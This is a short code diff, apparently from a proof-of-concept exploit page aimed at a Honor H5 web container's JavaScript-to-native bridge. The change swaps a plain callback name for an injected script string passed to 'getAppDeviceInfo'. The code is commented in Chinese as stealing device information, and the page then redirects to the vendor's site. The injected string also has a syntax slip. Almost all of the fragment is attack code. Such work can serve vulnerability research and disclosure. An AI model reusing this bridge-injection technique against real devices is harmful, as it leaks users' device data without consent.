@@ -32,7 +32,7 @@
   });
         var newFunc = MyCallback.toString();
         var realFunc = "(()=>{" + 'alert(document.domain;' + newFunc + ";MyCallback();})();//"
-        window.Native.nativeMethod("com.hihonor.hm.h5.container.js.method.DeviceMethods", "getAppDeviceInfo", test_Json, "1", "MyCallback");// 窃取设备信息
+        window.Native.nativeMethod("com.hihonor.hm.h5.container.js.method.DeviceMethods", "getAppDeviceInfo", test_Json, "1", realFunc);// 窃取设备信息
         location.href = "https://www.hihonor.com";
       }
       else {
